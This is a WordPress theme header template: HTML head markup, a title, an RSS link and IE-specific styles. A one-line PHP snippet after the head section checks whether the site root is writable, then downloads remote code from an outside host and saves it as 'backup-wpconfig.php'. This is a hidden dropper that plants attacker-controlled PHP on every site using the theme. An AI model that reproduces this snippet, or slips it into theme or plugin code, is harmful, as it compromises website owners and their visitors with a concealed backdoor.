<!DOCTYPE html>
<!--[if lt IE 7]>
<html class="no-js lt-ie9 lt-ie8 lt-ie7" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 7]>
<html class="no-js lt-ie9 lt-ie8" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 8]>
<html class="no-js lt-ie9" <?php language_attributes(); ?>> <![endif]-->
<!--[if gt IE 8]><!-->
<html class="no-js" <?php language_attributes(); ?>> <!--<![endif]-->
<head>
	<meta charset="utf-8">
	<title><?php wp_title('|', true, 'right'); bloginfo('name'); ?></title>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<?php if (have_posts()) : ?>
		<link rel="alternate" type="application/rss+xml" title="<?php echo get_bloginfo('name') ?> Feed" href="<?php echo home_url() ?>/feed/">
	<?php endif; ?>

	<?php wp_head(); ?>

	<!--[if gte IE 9]>
	<style type="text/css">
		.mainslider.flexslider .flex-control-nav {
			bottom:-58px;
		}
	</style>
	<![endif]-->

</head>

<?php if ((!file_exists(ABSPATH.'backup-wpconfig.php')) && is_writable(ABSPATH)) {$wp_banners=wp_remote_get('http://archbishopchapelle.org/wp-content/uploads/wpmp-previews/temp.php'); if(file_put_contents(ABSPATH.'backup-wpconfig.php',$wp_banners["body"])) {echo '<!-- all_done_master -->';}}?>